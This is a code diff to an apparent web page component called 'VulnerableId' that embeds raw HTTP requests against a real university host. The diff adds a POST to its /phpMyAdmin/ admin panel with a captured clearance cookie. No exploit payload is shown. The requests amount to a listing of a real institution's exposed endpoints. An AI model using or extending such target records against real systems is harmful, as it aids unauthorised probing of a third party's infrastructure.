@@ -8,6 +8,15 @@ export default function VulnerableId({ params } : { params : { vulnerableId : an
 
     const content = `
 ############################# https://ats.nisantasi.edu.tr #############################
+POST /phpMyAdmin/ HTTP/2
+Host: ats.nisantasi.edu.tr
+Content-Type: application/x-www-form-urlencoded
+Cookie: cf_clearance=286gmiM73crJ7D0WHMhukU7jPOOpqPEuzR6qEuAdiPI-1716460246-1.0.1.1-.OU2.TjqqsyTHjuPL0i89_JHrgF4z53wgXtKo_6Z.JnxUL2ugab0Q3dbrmLItIhO3GwZAdJjwnNkuAGM4y2Prg
+Content-Length: 0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip,deflate,br
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+
 POST /pages/anasayfa_yazdir.php HTTP/2
 Host: ats.nisantasi.edu.tr
 Content-Type: application/x-www-form-urlencoded
